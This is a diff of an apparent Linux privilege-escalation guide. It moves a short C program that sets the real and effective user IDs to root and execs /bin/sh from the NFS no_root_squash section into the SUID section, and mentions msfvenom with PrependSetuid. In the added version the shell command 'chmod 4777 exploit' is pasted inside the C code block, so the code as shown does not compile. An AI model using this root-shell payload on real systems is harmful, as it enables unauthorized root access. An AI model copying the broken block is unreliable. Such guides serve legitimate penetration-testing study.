@@ -37,6 +37,24 @@ sudo -l
 
 Check any binaries in the above lists, both what they do and the version number. Many older applications have vulnerabilities that can lead to code execution so that is also worth reading up on.
 
+If you have a method of adding an SUID bit to a custom executable the following quick and dirty solution will work:
+
+```c
+chmod 4777 exploit
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+​
+int main( int argc, char *argv[] )
+{
+    setreuid(0, 0);
+    printf("ID: %d\n", geteuid());
+    execve("/bin/sh", NULL, NULL);
+}
+```
+
+You could also just generate a binary using msfvenom if desired, but this will require the `PrependSetuid=True` if spawning a `/bin/bash` shell.
+
 The following standard Unix tools have many easy ways to perform arbitrary code execution if you find yourself in a situation enabling you to execute them as a privileged user.
 
 #### awk {#awk}
@@ -204,30 +222,13 @@ Ideally, we'll see that `no_root_squash` or `no_all_squash` is enabled. When mou
 
 If you have write privileges you can create files. Test if you can create files, then check with your low-priv shell what user has created that file. If it says that it is the root-user that has created the file it is good news. Then you can create a file and set it with suid-permission from your attacking machine. And then execute it with your low privilege shell.
 
-This code can be compiled and added to the share. Before executing it by your low-priv user make sure to set the suid-bit on it, like this:
-
-```bash
-chmod 4777 exploit
-```
-
-```c
-#include <stdio.h>
-#include <stdlib.h>
-#include <unistd.h>
-
-int main( int argc, char *argv[] )
-{
-    setreuid(0, 0);
-    printf("ID: %d\n", geteuid());
-    execve("/bin/sh", NULL, NULL);
-}
-```
-
-You could also just generate a binary using msfvenom if desired, but this will require the `PrependSetuid=True` if spawning a `/bin/bash` shell.
+This code can be compiled and added to the share. Before executing it by your low-priv user make sure to set the suid-bit on it.
 
 **Further Reading**:  
 [NFS, no\_root\_squash and SUID - Basic NFS Security](http://fullyautolinux.blogspot.co.uk/2015/11/nfs-norootsquash-and-suid-basic-nfs.html)  
 [HackTheBox-Jail](https://reboare.github.io/htb/htb-jail.html#becoming-somebody)
+
+
 
 ## Abusing Excessive Groups
 
